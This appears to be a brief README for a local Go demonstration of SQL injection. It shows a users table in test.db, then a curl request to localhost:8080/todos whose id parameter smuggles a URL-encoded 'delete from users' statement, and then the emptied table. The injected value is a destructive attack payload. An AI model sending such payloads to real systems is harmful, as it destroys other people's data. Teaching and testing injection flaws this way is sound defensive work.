# sql injection

1. run main.go
```sh
$ go run main.go
```

2. confirm there has data
```sh
$ sqlite3 test.db
sqlite> select * from users;
gorilla|12344
cat|!5698709
```

3. call web api
```sh
$ curl -s localhost:8080/todos\?id=1%3Bdelete%20from%20users
```

4. data was deleted
```sh
sqlite> select * from users;
```
